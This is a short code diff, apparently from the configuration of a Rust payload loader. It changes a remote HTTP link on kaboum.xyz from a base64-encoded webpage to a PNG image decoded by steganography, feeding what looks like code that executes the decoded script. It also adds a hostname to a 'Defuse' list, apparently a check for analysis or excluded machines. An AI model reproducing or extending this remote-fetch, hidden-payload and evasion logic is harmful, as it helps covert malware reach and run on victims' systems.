@@ -174,8 +174,8 @@ exec(decoded_script)
                 sleep: 0,
             }),
             Link::HTTP(HTTPLink {
-                url: String::from("https://kaboum.xyz/artdonjon/troll.html"),
-                dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
+                dataoperation: vec![DataOperation::STEGANO],
                 jitt: 0,
                 sleep: 0,
             }),
@@ -193,6 +193,7 @@ exec(decoded_script)
             Defuse::Hostname(Hostname {
                 list: vec![
                     "DEBUG-W10".to_string(),
+                    "DRACONYS".to_string(),
                 ],
                 operator: Operator::OR,
             }),
